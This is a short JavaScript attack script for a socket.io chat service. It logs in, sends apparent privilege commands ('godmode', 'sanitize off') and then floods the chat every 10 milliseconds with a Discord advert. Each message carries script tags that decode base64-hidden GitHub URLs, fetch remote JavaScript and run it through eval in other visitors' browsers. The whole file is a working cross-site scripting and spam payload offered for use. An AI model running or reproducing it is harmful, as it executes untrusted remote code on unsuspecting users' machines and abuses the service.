setInterval(() => {
    const socket = io("//");
    socket.emit("client", "MAIN");
    socket.emit("login", {
        name: "777",
    });
    socket.emit('command', {
      list: ['godmode']
    });
    socket.emit('command', {
        list: ['sanitize', 'off']
    });
    setInterval(() => {
    const color = Math.floor(Math.random()*2) === 1 ? 'black' : 'red';
    socket.emit('command', { list: ['color', color] });
    socket.emit("talk", {
        text: "joining my discord really helps me out joining my discord really helps me out joining my discord really helps me out <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'777'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script><script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'777S'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script> https://discord.gg/ZckU92Xbay"
    });
    },10)
}, 1000)
